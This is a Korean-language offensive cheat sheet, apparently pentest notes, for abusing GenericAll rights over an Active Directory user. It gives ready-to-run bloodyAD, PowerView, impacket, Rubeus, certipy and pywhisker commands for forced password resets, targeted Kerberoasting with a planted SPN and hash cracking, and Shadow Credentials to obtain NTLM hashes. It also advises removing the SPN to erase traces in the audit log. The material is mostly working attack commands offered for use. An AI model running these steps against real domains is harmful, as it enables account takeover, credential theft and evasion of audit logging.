# 유저 대상

GenericAll은 대상 오브젝트에 대한 완전한 제어권이다. 유저 대상으로 GenericAll이 있으면 패스워드 강제 변경, SPN 설정(Kerberoasting), Shadow Credentials 세 가지 공격이 가능하다. BloodHound에서 발견 즉시 가장 우선적으로 악용한다.

---

## 패스워드 강제 변경

현재 패스워드 없이 대상 계정의 패스워드를 임의로 변경한다. 변경 후 새 패스워드로 직접 로그인하거나 다음 단계로 이어간다. 서비스 계정 대상 시 서비스 중단 위험이 있으므로 주의한다.

```bash
# bloodyAD — 가장 간단한 방법
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  set password <대상유저> 'NewPass123!'  # ← 수정

# NTLM 해시로 인증 (PtH 상태)
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -H <NTLM> \
  set password <대상유저> 'NewPass123!'

# net rpc
net rpc password <대상유저> 'NewPass123!' \
  -U <도메인>/<공격자계정>%'<패스워드>' \
  -S <DC_IP>  # ← 수정

# 변경 후 로그인 확인
nxc smb <DC_IP> -u <대상유저> -p 'NewPass123!'
evil-winrm -i <대상IP> -u <대상유저> -p 'NewPass123!'
```

```powershell
# PowerView
Set-DomainUserPassword -Identity <대상유저> `
  -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose

# 권한 있는 다른 계정의 자격증명으로 실행할 때
$Cred = New-Object System.Management.Automation.PSCredential(
  '<도메인>\<공격자계정>',
  (ConvertTo-SecureString '<패스워드>' -AsPlainText -Force)
)
Set-DomainUserPassword -Identity <대상유저> `
  -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) `
  -Credential $Cred -Verbose
```

## SPN 설정 → Targeted Kerberoasting

SPN이 없는 계정에 SPN을 강제 설정해 Kerberoastable 상태로 만든 뒤 TGS 해시를 추출하고 오프라인으로 크래킹한다. 공격 후 SPN을 제거하지 않으면 AD 감사 로그(Event ID 5136)에 흔적이 남는다.

```bash
# 1단계: SPN 설정 (LDAP 389)
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  set object <대상유저> servicePrincipalName -v 'http/fake'  # ← 수정

# 설정 확인
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  get object <대상유저> --attr servicePrincipalName

# 2단계: TGS 해시 추출 (Kerberos 88)
impacket-GetUserSPNs <도메인>/<공격자계정>:'<패스워드>' \
  -dc-ip <DC_IP> \
  -request-user <대상유저> \
  -outputfile kerb.hash  # ← 수정

# 3단계: 크래킹 (07_password_cracking 참조)
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

# 4단계: SPN 제거 (흔적 제거)
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  set object <대상유저> servicePrincipalName -v ''
```

```powershell
# PowerView — SPN 설정
Set-DomainObject -Identity <대상유저> `
  -Set @{serviceprincipalname='http/fake'} -Verbose  # ← 수정

# Rubeus — TGS 해시 추출
.\Rubeus.exe kerberoast /user:<대상유저> /nowrap /outfile:kerb.hash

# SPN 제거
Set-DomainObject -Identity <대상유저> -Clear serviceprincipalname -Verbose
```

## Shadow Credentials

대상 계정의 msDS-KeyCredentialLink 속성에 공격자 인증서를 등록해 PKINIT(인증서 기반 Kerberos)으로 해당 계정의 NTLM 해시를 획득한다. 패스워드 변경 없이 계정을 탈취하므로 탐지가 어렵다. DC가 Windows Server 2016 이상이고 PKINIT을 지원해야 동작한다.

```bash
# certipy 자동화 (가장 간단)
# → NTLM 해시 출력 → PtH 공격으로 이어짐
certipy shadow auto \
  -u <공격자계정>@<도메인> -p '<패스워드>' \
  -account <대상유저> -dc-ip <DC_IP>  # ← 수정

# bloodyAD
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  add shadowCredentials <대상유저>  # ← 수정

# 수동 (pywhisker + PKINITtools)
# 1단계: 인증서 등록
pywhisker -d <도메인> -u <공격자계정> -p '<패스워드>' \
  --target <대상유저> --action add --dc-ip <DC_IP>
# → OUTPUT.pfx + PFX_PASS 출력

# 2단계: PFX로 TGT 발급
python3 gettgtpkinit.py \
  -cert-pfx OUTPUT.pfx -pfx-pass '<PFX_PASS>' \
  <도메인>/<대상유저> <대상유저>.ccache  # ← 수정

# 3단계: TGT로 NTLM 해시 추출 → PtH 공격
export KRB5CCNAME=<대상유저>.ccache
python3 getnthash.py <도메인>/<대상유저> -k
```

```powershell
# Whisker (출력된 Rubeus 명령어를 그대로 복사해 실행)
.\Whisker.exe add /target:<대상유저> /domain:<도메인> /dc:<DC_IP>  # ← 수정
```
